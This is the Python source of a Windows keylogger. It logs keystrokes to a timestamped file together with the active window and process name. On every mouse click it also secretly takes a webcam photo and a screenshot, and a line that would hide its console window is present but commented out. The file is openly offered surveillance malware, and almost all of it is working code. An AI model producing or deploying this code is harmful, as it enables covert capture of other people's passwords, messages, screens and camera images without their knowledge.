# Python code for keylogger
# to be used in windows
import os
import win32api
import win32console
import win32process
import win32gui
import pythoncom
from pynput import keyboard
from pynput.mouse import Listener
from datetime import datetime
import psutil
import subprocess
from mss import mss
import cv2
import time


#win = win32console.GetConsoleWindow()
#win32gui.ShowWindow(win, 0)

def getTimestamp():
    dateTimeObj = datetime.now()
    return dateTimeObj.strftime("-%d-%b-%Y-%H-%M-%S-%f")

timestampStr = getTimestamp()


def getProcessName():

    pname=win32gui.GetWindowText (win32gui.GetForegroundWindow())
    pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    pname +=" "+psutil.Process(pid[-1]).name()
    #print(pname)
    return pname

actualProcessName = getProcessName()
actualProcessNameRef=[actualProcessName]

def writeInFile(str,timestampStr,actualProcessNameRef):
    writepath = "E:/Repo/python/klogger/klogger"+timestampStr+".txt"
    mode = 'a+' if os.path.exists(writepath) else 'w'
    with open(writepath, mode) as f:
        if actualProcessNameRef[0] != getProcessName() :
            #print("actualProcessName != oldProcessName")
            actualProcessNameRef[0]=getProcessName()
            f.write("\n"+actualProcessNameRef[0]+" :\n")
            f.write(str);
        f.close()

def on_press(key):
    print(key)
    try:
        #print('alphanumeric key {0} pressed'.format(key.char))
        writeInFile(key.char,timestampStr,actualProcessNameRef)
    except AttributeError:
        #print('special key {0} pressed'.format(key))
        getCharFromSpecialKey=switchSpecialKey.get(key, lambda: "")
        writeInFile(getCharFromSpecialKey(),timestampStr,actualProcessNameRef)

def space():
    return " "

def enter():
    return "\n"

switchSpecialKey = {
        keyboard.Key.space: space,
        keyboard.Key.enter: enter
    }

def on_release(key):
    #print('{0} released'.format(
        #key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def takeCameraScreenshot():
    video = cv2.VideoCapture(0)
    check, frame = video.read()
    time.sleep(0.2)
    check, frame = video.read()
    img_name = "opencv_frame_"+ getTimestamp() +".png"

    showPic = cv2.imwrite(img_name,frame)
    # 8. shutdown the camera
    video.release()
    return ""


def on_click(x, y, button, pressed):
    if(pressed):
        writeInFile("",timestampStr,actualProcessNameRef)
        print("click");
        cameraFilename = takeCameraScreenshot()
        print(cameraFilename)
        with mss() as sct:
            filename = sct.shot(output="screen"+getTimestamp()+".png")
            print(filename)
    pass

writeInFile("Start Listen\n",timestampStr,actualProcessNameRef)

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    with Listener(on_click=on_click) as listener:
        listener.join()

#with Listener(on_click=on_click) as listener:
#     listener.join()

#pythoncom.PumpMessages()
